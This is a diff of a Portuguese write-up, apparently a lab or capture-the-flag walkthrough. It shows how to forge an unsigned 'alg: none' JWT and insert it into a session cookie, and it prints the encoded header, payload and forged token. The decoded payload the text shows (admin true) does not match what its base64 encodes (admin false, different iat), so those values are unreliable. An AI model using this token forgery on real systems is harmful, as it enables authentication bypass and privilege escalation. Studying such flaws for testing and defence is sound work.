@@ -259,15 +259,16 @@ Agora para realizar o decode do base64 (codificação do token), utiliza-se o si
 {"id":12,"name":"trishul","email":"admin6@trishul.com","admin":true,"iat":1785015616} // Payload
 ```
 - decodificar separadamente o header do token jwt
-
-  - eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0 - Header
-  - eyJpZCI6MTIsIm5hbWUiOiJ0cmlzaHVsIiwiZW1haWwiOiJhZG1pbjZAdHJpc2h1bC5jb20iLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTc4NTAxMTk0MH0 - Payload
-
+```json
+  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0 # Header
+  eyJpZCI6MTIsIm5hbWUiOiJ0cmlzaHVsIiwiZW1haWwiOiJhZG1pbjZAdHJpc2h1bC5jb20iLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTc4NTAxMTk0MH0 # Payload
+```
 Ambos valores devem ser separados por ponto (Header[.]Payload[.]) sem a última coluna (assinatura) e inseridos novamente no cookie de sessão do navegador para tentar forjar o JWT.
 
 - Ficando da seguinte maneira:
-  - eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0[.]eyJpZCI6MTIsIm5hbWUiOiJ0cmlzaHVsIiwiZW1haWwiOiJhZG1pbjZAdHJpc2h1bC5jb20iLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTc4NTAxMTk0MH0[.] 
-
+```json
+  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0[.]eyJpZCI6MTIsIm5hbWUiOiJ0cmlzaHVsIiwiZW1haWwiOiJhZG1pbjZAdHJpc2h1bC5jb20iLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTc4NTAxMTk0MH0[.] 
+```
   OBS: Sem os colchetes
 
 Agora eu noto uma questão importante, mesmo logado eu não consigo acessar nenhuma rota presente no site para alterar o authorization header com o JWT que eu forjei.
